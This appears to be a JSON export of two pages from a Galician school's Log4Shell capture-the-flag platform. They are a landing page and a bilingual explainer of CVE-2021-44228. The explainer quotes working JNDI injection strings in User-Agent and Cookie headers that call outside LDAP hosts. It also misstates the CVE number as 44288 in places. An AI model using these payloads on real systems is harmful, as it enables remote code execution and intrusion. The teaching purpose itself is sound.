{"count":2,"results":[{"id":1,"title":"None","route":"index","content":"<div class=\"row\">\r\n    <div class=\"col-md-10\">\r\n        <img class=\"w-100 mx-auto d-block\" style=\"max-width: 500px;padding: 50px;padding-top: 14vh;\" src=\"/files/54cd649e34973630a969cd2a35740813/Apache_Log4j_Logo.png\" />\r\n<h2 class=\"text-center\">\r\n          <p>Log4Shell CTF</p>\r\n  <p>Inicio: XX/XX/22 XX:XX horas</p>\r\n  <p>Fin: XX/XX/22 XX:XX horas</p>\r\n      </h2>\r\n      <hr>\r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>\r\n       <h6 class=\"text-center\">Email de contacto: ciberseguridade @ iessanclemente.net</h6>\r\n    </div>\r\n</div>","draft":0,"hidden":0,"auth_required":0,"format":"html"},{"id":7,"title":"Log4Shell: CVE-2021-44228","route":"log4shell","content":"### Log4Shell\r\n\r\nO 9 de decembro de 2021 faise p\u00fablica a vulnerabilidade **CVE-2021-44228** (tam\u00e9n co\u00f1ecida como **Log4shell**). Tr\u00e1tase dunha vulnerabilidade que **permite a execuci\u00f3n remota de c\u00f3digo (RCE)**, que afecta \u00e1 librer\u00eda de software de c\u00f3digo aberto Log4j, desenvolta en linguaxe Java, mantida por *Apache Software Foundation* e moi utilizada no software empresarial Java para a escritura de logs.\r\n\r\nDebido ao amplo uso de Log4j, o sinxelo que \u00e9 explotar a vulnerabilidade e que permite ao atacante a execuci\u00f3n de comandos no equipo afectado (para ga\u00f1ar privilexios de administrador,  exfiltrar informaci\u00f3n, minado de  criptomonedas, \u2026), consid\u00e9rase \u00e1 CVE-2021-44288 como unha **vulnerabilidade de nivel cr\u00edtico**.\r\n\r\nOs atacantes lanzan petici\u00f3ns maliciosas coa seguinte estrutura: `${jndi:ldap://<servidor do atacante>/<payload>}` ou `${jndi:dns://<servidor do atacante>/<payload>}`. Este tipo de petici\u00f3ns ao ser procesadas por Log4j provocan que o equipo v\u00edtima con\u00e9ctase ao servidor do atacante, descarga o payload e exec\u00fatao. A continuaci\u00f3n p\u00f3dense ver alg\u00fans exemplos de petici\u00f3ns maliciosas incrustadas en campos do protocolo HTTP:\r\n  \r\n`User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`\r\n  \r\n  `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`\r\n\r\nTras a publicaci\u00f3n da vulnerabilidade, o GovCERT.ch (Computer Emergency Response Team) de Su\u00edza publicou a seguinte imaxe que resume o proceso de ataque e as medidas de defensa: \r\n  \r\n<h3 class=\"text-center\">\r\n  <img class=\"w-100 mx-auto d-block\" style=\"max-width: 1024px;padding: 5px;\" src=\"/files/6687ee0328271c73a99ca098d685fb6c/log4shell.png\" /></h3>\r\n<hr>\r\n\r\nEl 9 de diciembre de 2021 se hace p\u00fablica la vulnerabilidad **CVE-2021-44228** (tambi\u00e9n conocida como **Log4shell**). Se trata de una vulnerabilidad que **permite la ejecuci\u00f3n remota de c\u00f3digo (RCE)**, que afecta a la librer\u00eda de software de c\u00f3digo abierto Log4j, desarrollada en lenguaje Java, mantenida por Apache Software Foundation y muy utilizada en el software empresarial Java para la escritura de logs. Debido al amplio uso de Log4j, lo sencillo que es explotar la vulnerabilidad y que permite al atacante la ejecuci\u00f3n de comandos en el equipo afectado (para ganar privilegios de administrador, exfiltrar informaci\u00f3n, minado de criptomonedas, \u2026), se considera a CVE-2021-44288 como una **vulnerabilidad de nivel cr\u00edtico**.\r\n\r\nLos atacantes lanzan peticiones maliciosas con la siguiente estructura: `${jndi:ldap://<servidor del atacante>/<payload>}` o `${jndi:dns://<servidor do atacante>/<payload>}`. Este tipo de peticiones al ser procesadas por Log4j provocan que el equipo v\u00edctima se conecte al servidor LDAP del atacante, se descargue el payload y lo ejecute. A continuaci\u00f3n se pueden ver algunos ejemplos de peticiones maliciosas incrustadas en campos del protocolo HTTP:\r\n  \r\n`User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`\r\n  \r\n  `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`\r\n\r\nTras la publicaci\u00f3n de la vulnerabilidad, el GovCERT.ch (Computer Emergency Response Team) de Suiza public\u00f3 la anterior imagen que resume el proceso de ataque y las medidas de defensa\r\n  \r\n  \r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>\r\n   <h6 class=\"text-center\">Email de contacto: ciberseguridade @ iessanclemente.net</h6>","draft":0,"hidden":0,"auth_required":0,"format":"markdown"}],"meta":{}}